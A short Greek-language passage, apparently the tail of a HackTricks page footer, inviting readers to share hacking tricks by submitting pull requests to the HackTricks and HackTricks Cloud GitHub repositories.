* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
